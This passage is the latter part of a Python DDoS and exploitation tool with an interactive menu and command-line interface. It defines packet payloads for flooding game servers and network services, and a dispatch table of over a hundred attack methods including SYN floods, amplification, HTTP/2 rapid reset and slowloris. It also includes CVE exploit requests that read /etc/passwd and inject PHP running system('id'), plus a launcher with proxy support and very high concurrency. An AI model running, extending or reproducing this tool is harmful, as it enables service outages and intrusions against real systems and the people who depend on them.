    def _kerberos(self):
        self._tcp_svc("KERBEROS_FLOOD", 88,
            lambda: b"\x00\x00\x00\x0a\x6a\x81\x00\x00\x00\x00")

    def _ard(self):
        self._tcp_svc("ARD_FLOOD", 3283, lambda: secrets.token_bytes(100))

    def _sip(self):
        p = (f"INVITE sip:{self.target_ip} SIP/2.0\r\n"
             f"Via: SIP/2.0/UDP {rand_ip()}:5060\r\n"
             f"From: <sip:x@x>;tag=x\r\nTo: <sip:{self.target_ip}>\r\n"
             f"Call-ID: {secrets.token_hex(8)}\r\n"
             f"CSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n").encode()
        self._amp("SIP_FLOOD", 5060, lambda: p)

    # ═════════════════════════════════════════════════════════════════════
    #  GAMES
    # ═════════════════════════════════════════════════════════════════════

    def _minecraft(self):
        self._amp("MINECRAFT", 25565,
            lambda: b"\xfe\xfd\x09\x12\x34\x56\x78\x00\x00\x00\x00" +
                    secrets.token_bytes(50))

    def _minecraft_bot(self):
        self._amp("MINECRAFT_BOT", 25565,
            lambda: b"\x10\x00\xff\xff\x0fBot" + secrets.token_bytes(20))

    def _fivem(self):
        self._amp("FIVEM", 30120,
            lambda: b"\xff\xff\xff\xffgetinfo xxx" + secrets.token_bytes(100))

    def _fivem_token(self):
        self._amp("FIVEM_TOKEN", 30120,
            lambda: b"\xff\xff\xff\xffgetinfo " +
                    secrets.token_hex(random.randint(8, 16)).encode())

    def _teamspeak(self):
        self._amp("TEAMSPEAK", 9987,
            lambda: b"\x00\x01\x00\x00\x00\x00\x00\x00" + secrets.token_bytes(500))

    def _steam_query(self):
        self._amp("STEAM_QUERY", 27015,
            lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")

    def _samp(self):
        self._amp("SAMP_QUERY", 7777,
            lambda: b"SAMP" + secrets.token_bytes(8) + b"\x69")

    def _quake(self):
        self._amp("QUAKE_QUERY", 27960, lambda: b"\xff\xff\xff\xffgetinfo xxx")

    def _bittorrent(self):
        self._amp("BITTORRENT_DHT", 6881,
            lambda: b"d1:ad2:id20:" + secrets.token_bytes(20) +
                    b"e1:q4:ping1:t2:aa1:y1:qe")

    def _kad(self):
        self._amp("KAD_ATTACK", 4672,
            lambda: b"\xe4\x17" + secrets.token_bytes(16) +
                    socket.inet_aton("0.0.0.0") +
                    struct.pack(">H", 0) + struct.pack(">H", 0) + b"\x00")

    def _mcpe(self):
        self._amp("MCPE", 19132,
            lambda: b"\x01" +
                    struct.pack(">Q", int(time.time() * 1000) & 0xFFFFFFFFFFFFFFFF) +
                    b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd"
                    b"\x12\x34\x56\x78")

    # ═════════════════════════════════════════════════════════════════════
    #  CVE
    # ═════════════════════════════════════════════════════════════════════

    def _run_cve(self, cve_id: str):
        payloads = {
            "CVE_2021_41773": ("GET",
                                "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                                None),
            "CVE_2024_4577":  ("POST",
                                "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
                                b"<?php system('id'); ?>"),
            "CVE_2024_23897": ("POST", "/cli?remoting=false", b"@/etc/passwd"),
            "CVE_2025_24813": ("PUT", "/test/session", b"test"),
            "CVE_2025_29927": ("GET", "/", None),
            "CVE_2022_0073":  ("POST", "/admin/", b"cmd=id"),
            "CVE_2022_0074":  ("POST", "/admin/login.php",
                                b"user=admin&pass=admin"),
            "CVE_2023_28432": ("GET", "/admin/status", None),
        }
        data = payloads.get(cve_id)
        if not data:
            return
        method, path, body = data
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                self._record(cve_id, ok=False)
                continue
            try:
                req = (f"{method} {path} HTTP/1.1\r\n"
                       f"Host: {self.target_host}\r\n"
                       f"User-Agent: {random.choice(USER_AGENTS)}\r\n")
                if cve_id == "CVE_2025_29927":
                    req += ("x-middleware-subrequest: middleware:middleware:"
                            "middleware:middleware:middleware\r\n")
                if cve_id == "CVE_2024_23897":
                    req += "Session: \r\nSide: download\r\n"
                if body:
                    req += (f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: {len(body)}\r\n")
                req += "Connection: close\r\n\r\n"
                s.sendall(req.encode() + (body or b""))
                with suppress(Exception):
                    s.settimeout(1)
                    s.recv(1024)
                self._record(cve_id, 1, len(req))
            except Exception:
                self._record(cve_id, ok=False)
            finally:
                with suppress(Exception):
                    s.close()

    # ═════════════════════════════════════════════════════════════════════
    #  DISPATCH
    # ═════════════════════════════════════════════════════════════════════

    def _dispatch(self, method: str):
        try:
            table = {
                "SYN_FLOOD": self._syn_flood, "ACK_FLOOD": self._ack_flood,
                "RST_FLOOD": self._rst_flood, "FIN_FLOOD": self._fin_flood,
                "XMAS_FLOOD": self._xmas_flood, "NULL_FLOOD": self._null_flood,
                "PSH_FLOOD": self._psh_flood, "URG_FLOOD": self._urg_flood,
                "SYN_ACK_FLOOD": self._syn_ack_flood,
                "IPSPOOF_SYN": self._ipspoof_syn, "TCP_TS_SPOOF": self._tcp_ts_spoof,
                "TCP_SACK_ABUSE": self._tcp_sack, "TCP_FASTOPEN": self._tcp_fastopen,
                "LAND_ATTACK": self._land_attack, "TCP_AMP": self._tcp_amp,
                "SCTP_INIT": self._sctp_init,
                "UDP_FLOOD": self._udp_flood, "ICMP_FLOOD": self._icmp_flood,
                "ICMP_FRAG": self._icmp_frag, "JUMBO_FRAME": self._jumbo_frame,
                "FRAG_FLOOD": self._frag_flood, "GRE_FLOOD": self._gre_flood,
                "ESP_FLOOD": self._esp_flood, "IPIP_FLOOD": self._ipip_flood,
                "IP_OPTIONS_FLOOD": self._ip_options, "MAC_SPOOF": self._mac_spoof,
                "SMURF_ATTACK": self._smurf, "IPV6_RAW": self._ipv6_raw,
                "PQC_QUIC": self._pqc_quic,
                "DNS_AMP": self._dns_amp, "DNS_QUERY": self._dns_query,
                "DNS_EDNS0": self._dns_edns0, "NTP_MONLIST": self._ntp_monlist,
                "MEMCACHED": self._memcached, "SSDP": self._ssdp,
                "CLDAP": self._cldap, "LDAP_AMP": self._ldap,
                "SNMP": self._snmp, "NETBIOS": self._netbios,
                "MDNS": self._mdns, "WSD": self._wsd,
                "RIPV1": self._ripv1, "QOTD": self._qotd,
                "CHARGEN": self._chargen, "COAP": self._coap,
                "TFTP": self._tftp, "STUN": self._stun,
                "DTLS": self._dtls, "SLP": self._slp,
                "PORTMAP": self._portmap, "JENKINS": self._jenkins,
                "CISCO_SI": self._cisco_si, "MQTT_SN": self._mqtt_sn,
                "QUAKE3": self._quake3, "STEAM_A2S": self._steam_a2s,
                "RDP_UDP": self._rdp_udp, "BACNET": self._bacnet,
                "IPMI": self._ipmi, "OPENVPN": self._openvpn,
                "IKE": self._ike, "PPTP": self._pptp,
                "L2TP": self._l2tp, "ZIGBEE": self._zigbee,
                "HTTP_FLOOD": self._http_flood, "HTTP_GET": self._http_get,
                "HTTP_POST": self._http_post, "HTTP_HEAD": self._http_head,
                "HTTP_PIPELINE": self._http_pipeline,
                "CFB": self._cfb, "CFBUAM": self._cfbuam,
                "BYPASS": self._bypass, "DYN": self._dyn,
                "NULL_HTTP": self._null_http, "COOKIE": self._cookie,
                "PPS": self._pps, "GSB": self._gsb, "RHEX": self._rhex,
                "BOT": self._bot, "STRESS": self._stress,
                "BOMB": self._bomb, "APACHE_KILLER": self._apache_killer,
                "XMLRPC": self._xmlrpc, "HEADER_BOMB": self._header_bomb,
                "CACHE_BYPASS": self._cache_bypass,
                "CACHE_POISONING": self._cache_poison,
                "CF_BYPASS": self._cf_bypass, "RANGE_BOMB": self._range_bomb,
                "RANGE_AMP": self._range_amp,
                "JSON_BOMB": self._json_bomb, "XML_BOMB": self._xml_bomb,
                "PROTOBUF_BOMB": self._protobuf_bomb, "BROTLI_BOMB": self._brotli_bomb,
                "REGEX_DOS": self._regex_dos,
                "GRAPHQL_DEPTH": self._graphql_depth,
                "GRAPHQL_ALIAS": self._graphql_alias,
                "SMUGGLE_CLTE": self._smuggle_clte,
                "SMUGGLE_TECL": self._smuggle_tecl,
                "HOST_HEADER_INJECT": self._host_header_inject,
                "OPERATOR_FATIGUE": self._operator_fatigue,
                "HTTP2_RAPID_RESET": self._h2_rapid_reset,
                "HTTP2_PING": self._h2_ping, "HTTP2_SETTINGS": self._h2_settings,
                "HTTP2_WINDOW_UPDATE": self._h2_window,
                "HTTP2_HPACK_BOMB": self._h2_hpack_bomb,
                "HTTP2_MULTIPLEX": self._h2_multiplex,
                "HTTP2_GOAWAY": self._h2_goaway,
                "HTTP2_RST_SPAM": self._h2_rst_spam,
                "HTTP2_MADE_YOU_RESET": self._h2_made_you_reset,
                "HTTP2_SMUGGLING": self._h2_smuggling,
                "HTTP2_GRPC_CHURN": self._h2_grpc_churn,
                "HTTP2_PRIORITY": self._h2_priority,
                "HTTP2_CONTINUATION": self._h2_continuation,
                "HTTP3_QUIC_FLOOD": self._h3_quic_flood,
                "HTTP3_QPACK_BOMB": self._h3_qpack_bomb,
                "HTTP3_RETRY_LOOP": self._h3_retry,
                "HTTP3_0RTT": self._h3_0rtt,
                "HTTP3_CLOSE_FLOOD": self._h3_close,
                "HTTP3_STREAM_RESET": self._h3_stream_reset,
                "QUIC_LEAK": self._quic_leak,
                "TLS_CLIENT_HELLO": self._tls_client_hello,
                "TLS_JA3_RANDOM": self._tls_ja3,
                "TLS_JA4_RANDOM": self._tls_ja4,
                "TLS_RENEGOTIATION": self._tls_reneg,
                "TLS_HEARTBLEED": self._tls_heartbleed,
                "TLS_ECH_FLOOD": self._tls_ech,
                "SNI_FLOOD": self._sni_flood, "SNI_SPOOF": self._sni_spoof,
                "REDIS_FLOOD": self._redis, "MONGO_FLOOD": self._mongo,
                "ELASTIC_BOMB": self._elastic, "MQTT_FLOOD": self._mqtt,
                "AMQP_FLOOD": self._amqp, "RDP_FLOOD": self._rdp,
                "VNC_FLOOD": self._vnc, "SMB_FLOOD": self._smb,
                "SMTP_FLOOD": self._smtp, "IMAP_FLOOD": self._imap,
                "POP3_FLOOD": self._pop3, "FTP_FLOOD": self._ftp,
                "TELNET_FLOOD": self._telnet, "SSH_FLOOD": self._ssh,
                "SIP_FLOOD": self._sip, "RTSP_FLOOD": self._rtsp,
                "NFS_FLOOD": self._nfs, "KERBEROS_FLOOD": self._kerberos,
                "ARD_FLOOD": self._ard,
                "MINECRAFT": self._minecraft, "MINECRAFT_BOT": self._minecraft_bot,
                "FIVEM": self._fivem, "FIVEM_TOKEN": self._fivem_token,
                "TEAMSPEAK": self._teamspeak, "STEAM_QUERY": self._steam_query,
                "SAMP_QUERY": self._samp, "QUAKE_QUERY": self._quake,
                "BITTORRENT_DHT": self._bittorrent, "KAD_ATTACK": self._kad,
                "MCPE": self._mcpe,
                "CVE_2021_41773": lambda: self._run_cve("CVE_2021_41773"),
                "CVE_2024_4577": lambda: self._run_cve("CVE_2024_4577"),
                "CVE_2024_23897": lambda: self._run_cve("CVE_2024_23897"),
                "CVE_2025_24813": lambda: self._run_cve("CVE_2025_24813"),
                "CVE_2025_29927": lambda: self._run_cve("CVE_2025_29927"),
                "CVE_2022_0073": lambda: self._run_cve("CVE_2022_0073"),
                "CVE_2022_0074": lambda: self._run_cve("CVE_2022_0074"),
                "CVE_2023_28432": lambda: self._run_cve("CVE_2023_28432"),
            }
            fn = table.get(method)
            if fn:
                while not self._stop:
                    fn()
            else:
                self._http_flood()
        except (KeyboardInterrupt, SystemExit):
            raise
        except Exception as e:
            log.debug(f"worker {method}: {e}")

    async def _async_worker(self, method: str, sem: asyncio.Semaphore):
        try:
            if method == "SLOWLORIS":
                await self._slowloris(sem)
            elif method == "SLOW_READ":
                await self._slow_read(sem)
            elif method == "RUDY":
                await self._rudy(sem)
            elif method == "SLOW_HEADERS":
                await self._slow_headers(sem)
            elif method == "SLOW_BODY":
                await self._slow_body(sem)
            elif method == "WEBSOCKET_FLOOD":
                await self._ws_flood(sem)
            elif method == "WEBSOCKET_ZIP":
                await self._ws_zip(sem)
            elif method == "INFINITY_MIX":
                while not self._stop:
                    for m in ("SLOWLORIS", "SLOW_READ", "RUDY", "WEBSOCKET_FLOOD"):
                        if self._stop:
                            return
                        await self._async_worker(m, sem)
        except Exception as e:
            log.debug(f"async {method}: {e}")

    # ═════════════════════════════════════════════════════════════════════
    #  LAUNCH / STOP
    # ═════════════════════════════════════════════════════════════════════

    def launch(self, acfg: AttackConfig):
        with self._lifecycle:
            if self.running:
                raise RuntimeError("already running")
            self.running = True
            self._stop = False

        self._parse_target(acfg.target)
        self.target_port = acfg.port or self.target_port
        self.method = acfg.method.upper()
        self.duration = max(1, min(acfg.duration, MAX_DURATION))
        self.concurrency = max(10, min(acfg.concurrency, 500000))
        self.use_proxy = acfg.use_proxy
        self.waf_bypass = acfg.waf_bypass
        self.adaptive = acfg.adaptive
        self.rate_limit_pps = acfg.rate_limit_pps
        self.game_port = acfg.game_port
        self.victim_ip = acfg.victim_ip

        self.fixed_limiter = FixedRateLimiter(self.rate_limit_pps)
        self.rate_limiter = AdaptiveRateLimiter(
            base_rate=max(500, self.concurrency // 2),
            burst=max(2000, self.concurrency),
            min_rate=200, max_rate=1000000)
        self.stats.reset()
        with self._mstat_lock:
            self.method_stats.clear()
        self._start_mono = time.monotonic()
        self._health = {"alive": False, "error": "n/a"}

        raise_fd_limit()
        resource_gate.start()
        self._start_loop()

        self._health_stop.clear()
        threading.Thread(target=self._health_loop, daemon=True, name="health").start()
        self._live_stop.clear()
        threading.Thread(target=self._live_stats, daemon=True, name="live").start()
        self._monitor_stop.clear()
        threading.Thread(target=self._monitor_loop, daemon=True, name="monitor").start()

        num_threads = max(16, min(200, (os.cpu_count() or 4) * 4))
        self.executor = ThreadPoolExecutor(max_workers=num_threads,
                                            thread_name_prefix="cgdn")

        if self.method == "INFINITY_MIX":
            method_pool = [m for m in ALL_METHODS if m != "INFINITY_MIX"]
            for i in range(num_threads):
                m = method_pool[i % len(method_pool)]
                self.executor.submit(self._dispatch, m)
            conc = max(50, self.concurrency // 8)

            async def _async_runner():
                sem = asyncio.Semaphore(conc)
                await asyncio.gather(
                    *[self._async_worker("INFINITY_MIX", sem) for _ in range(conc)],
                    return_exceptions=True)

            self._submit(_async_runner())
        elif self.method in ASYNC_METHODS:
            conc = max(10, self.concurrency // 20)

            async def _runner():
                sem = asyncio.Semaphore(conc)
                await asyncio.gather(
                    *[self._async_worker(self.method, sem) for _ in range(conc)],
                    return_exceptions=True)

            self._submit(_runner())
        else:
            for _ in range(num_threads):
                self.executor.submit(self._dispatch, self.method)

        def _auto_stop():
            time.sleep(self.duration)
            self.stop()

        threading.Thread(target=_auto_stop, daemon=True, name="auto-stop").start()

    def stop(self):
        with self._lifecycle:
            if not self.running:
                return
            self.running = False
            self._stop = True
        self._health_stop.set()
        self._live_stop.set()
        self._monitor_stop.set()
        if self.executor:
            with suppress(Exception):
                self.executor.shutdown(wait=False)
            self.executor = None
        self._stop_loop()
        resource_gate.stop()

    def status(self) -> Dict[str, Any]:
        snap = self.stats.snapshot()
        rg = resource_gate.snapshot()
        with self._mstat_lock:
            mstat = dict(self.method_stats)
        return {
            "running": self.running,
            "target": self.target_url,
            "target_ip": self.target_ip,
            "port": self.target_port,
            "method": self.method,
            "duration": self.duration,
            "elapsed": snap["elapsed"],
            "eta": max(0.0, self.duration - snap["elapsed"]),
            "sent": snap["sent"], "failed": snap["failed"],
            "bytes": snap["bytes"], "mbps": snap["mbps"], "rate": snap["rate"],
            "methods": mstat,
            "cpu": rg["cpu"], "ram": rg["ram"], "scale": rg["scale"],
            "limiter": self.rate_limiter.get_rate(),
            "health": self._health,
            "proxy": {"total": proxy_mgr.count()},
            "waf": self.waf_detected.name,
        }


engine = Engine()


# ═══════════════════════════════════════════════════════════════════════════════
#  BANNER + CLI
# ═══════════════════════════════════════════════════════════════════════════════

def print_banner():
    os.system("cls" if IS_WINDOWS else "clear")
    w = term_w()
    art = r"""
   ██████╗ ██████╗ ██████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗███╗   ██╗
  ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔═══██╗████╗  ██║██║████╗  ██║
  ██║     ██║  ███╗██║  ██║██╔██╗ ██║██║   ██║██╔██╗ ██║██║██╔██╗ ██║
  ██║     ██║   ██║██║  ██║██║╚██╗██║██║   ██║██║╚██╗██║██║██║╚██╗██║
  ╚██████╗╚██████╔╝██████╔╝██║ ╚████║╚██████╔╝██║ ╚████║██║██║ ╚████║
   ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝
        U N I F I E D   ·   S U P R E M E   ·   E N G I N E
"""
    print(f"{C.PRIMARY}{C.BOLD}{art}{C.RESET}")
    print(f"  {C.ACCENT}v{APP_VERSION}{C.RESET}  ·  {APP_CHANNEL}")
    print(f"  {C.DIM}methods: {len(ALL_METHODS)} · themes: {len(THEMES)} · langs: {len(LANGS)}{C.RESET}")
    print(f"  {C.DIM}platform: {PLATFORM_NAME} · admin: {'YES' if HAS_ADMIN else 'NO'} · "
          f"raw: {'OK' if HAS_RAW else 'NO'} · loop: {_LOOP_BACKEND}{C.RESET}")
    print(f"{C.PRIMARY}{'═' * w}{C.RESET}")


def menu_methods() -> str:
    print(f"\n{C.PRIMARY}Methods ({len(ALL_METHODS)}):{C.RESET}")
    for i, (m, e) in enumerate(METHODS, 1):
        end = "\n" if i % 2 == 0 else "   "
        print(f"  {C.GREEN}{i:>3}.{C.RESET} {e} {m:<38}", end=end)
    if len(METHODS) % 2:
        print()
    while True:
        v = safe_input(f"\n{C.YELLOW}>> method (name or #, default=INFINITY_MIX): ").strip()
        if not v:
            return "INFINITY_MIX"
        if v.isdigit() and 1 <= int(v) <= len(ALL_METHODS):
            return ALL_METHODS[int(v) - 1]
        if v.upper() in ALL_METHODS:
            return v.upper()


def menu_theme():
    names = list(THEMES.keys())
    for i, n in enumerate(names, 1):
        print(f"  {C.PRIMARY}{i:>2}.{C.RESET} {n}")
    v = safe_input(f"{C.YELLOW}>> theme [cyberghost]: ").strip() or "cyberghost"
    if v.isdigit() and 1 <= int(v) <= len(names):
        apply_theme(names[int(v) - 1])
        cfg.theme = names[int(v) - 1]
        cfg.save()


def menu_lang():
    codes = list(LANGS.keys())
    for i, c in enumerate(codes, 1):
        print(f"  {C.PRIMARY}{i}.{C.RESET} {c}")
    v = safe_input(f"{C.YELLOW}>> lang [fa]: ").strip() or "fa"
    if v.isdigit() and 1 <= int(v) <= len(codes):
        set_lang(codes[int(v) - 1])
        cfg.lang = codes[int(v) - 1]
        cfg.save()


def interactive_menu():
    while True:
        print_banner()
        print(f"  {C.ACCENT}1.{C.RESET} {t('attack')}")
        print(f"  {C.ACCENT}2.{C.RESET} methods list")
        print(f"  {C.ACCENT}3.{C.RESET} proxy manager")
        print(f"  {C.ACCENT}4.{C.RESET} theme")
        print(f"  {C.ACCENT}5.{C.RESET} language")
        print(f"  {C.ACCENT}6.{C.RESET} {t('about')}")
        print(f"  {C.ACCENT}0.{C.RESET} {t('exit')}\n")
        ch = safe_input(f"{C.YELLOW}>> select: ").strip() or "0"
        if ch == "0":
            print(f"\n{C.CYAN}{APP_FULL}{C.RESET}")
            print(f"{C.DIM}{t('goodbye')} 🐉{C.RESET}\n")
            return
        if ch == "1":
            target = safe_input(f"{C.YELLOW}>> target URL: ").strip()
            if not target:
                continue
            try:
                target = validate_url(target)
            except SanitizeError as e:
                print(f"{C.RED}{e}{C.RESET}")
                safe_input()
                continue
            port_s = safe_input(f"{C.YELLOW}>> port [auto]: ").strip()
            try:
                port = int(port_s) if port_s else 0
            except ValueError:
                port = 0
            method = menu_methods() or "INFINITY_MIX"
            dur_s = safe_input(f"{C.YELLOW}>> duration [180]: ").strip() or "180"
            try:
                dur = int(dur_s)
            except ValueError:
                dur = DEFAULT_DURATION
            conc_s = safe_input(f"{C.YELLOW}>> concurrency [2000]: ").strip() or "2000"
            try:
                conc = int(conc_s)
            except ValueError:
                conc = 2000
            use_px = safe_input(f"{C.YELLOW}>> proxy (y/n) [n]: ").strip().lower() == "y"
            ack = safe_input(f"{C.RED}>> type 'I AGREE': ")
            if ack.strip().upper() != "I AGREE":
                print(f"{C.RED}cancelled{C.RESET}")
                safe_input()
                continue
            acfg = AttackConfig(target=target, port=port, method=method,
                                 duration=dur, concurrency=conc, use_proxy=use_px)
            try:
                engine.launch(acfg)
                while engine.running:
                    time.sleep(0.5)
            except KeyboardInterrupt:
                engine.stop()
            print()
            safe_input(f"{C.DIM}Enter to continue...")
        elif ch == "2":
            menu_methods()
            safe_input()
        elif ch == "3":
            print(f"{C.CYAN}proxies: {proxy_mgr.count()}{C.RESET}")
            fetch = safe_input(f"{C.YELLOW}>> fetch? (y/n): ").strip().lower() == "y"
            if fetch:
                loop = asyncio.new_event_loop()
                try:
                    n = loop.run_until_complete(proxy_mgr.load())
                    print(f"{C.GREEN}fetched: {n}{C.RESET}")
                finally:
                    loop.close()
            safe_input()
        elif ch == "4":
            menu_theme()
        elif ch == "5":
            menu_lang()
        elif ch == "6":
            print(f"\n{APP_FULL} v{APP_VERSION}")
            print(f"parent : {APP_PARENT}")
            print(f"author : {APP_AUTHOR}")
            print(f"channel: {APP_CHANNEL}")
            print(f"contact: {APP_CONTACT}")
            print(f"methods: {len(ALL_METHODS)}")
            print(f"themes : {len(THEMES)}")
            print(f"langs  : {len(LANGS)}\n")
            safe_input()


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(description=f"{APP_FULL} v{APP_VERSION}")
    ap.add_argument("--mode", choices=["menu", "cli", "list", "about"], default="menu")
    ap.add_argument("--target")
    ap.add_argument("--port", type=int, default=0)
    ap.add_argument("--method", default="INFINITY_MIX")
    ap.add_argument("--duration", type=int, default=DEFAULT_DURATION)
    ap.add_argument("--concurrency", type=int, default=2000)
    ap.add_argument("--proxy", action="store_true")
    ap.add_argument("--theme")
    ap.add_argument("--lang")
    ap.add_argument("--version", action="version", version=f"{APP_NAME} v{APP_VERSION}")
    args = ap.parse_args()

    if args.theme:
        apply_theme(args.theme)
    if args.lang:
        set_lang(args.lang)

    if args.mode == "list":
        for m, e in METHODS:
            print(f"  {e}  {m}")
        print(f"\ntotal: {len(METHODS)}")
        return
    if args.mode == "about":
        print(f"{APP_FULL} v{APP_VERSION}")
        print(f"channel : {APP_CHANNEL}")
        print(f"contact : {APP_CONTACT}")
        print(f"parent  : {APP_PARENT}")
        print(f"methods : {len(ALL_METHODS)}")
        return
    if args.mode == "cli":
        if not args.target:
            print("error: --target required")
            return
        try:
            target = validate_url(args.target)
        except SanitizeError as e:
            print(f"error: {e}")
            return
        acfg = AttackConfig(target=target, port=args.port, method=args.method,
                             duration=args.duration, concurrency=args.concurrency,
                             use_proxy=args.proxy)
        try:
            engine.launch(acfg)
            while engine.running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            engine.stop()
        return
    interactive_menu()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.WARN}interrupted{C.RESET}")
    except Exception as e:
        print(f"{C.RED}fatal: {e}{C.RESET}")
        traceback.print_exc()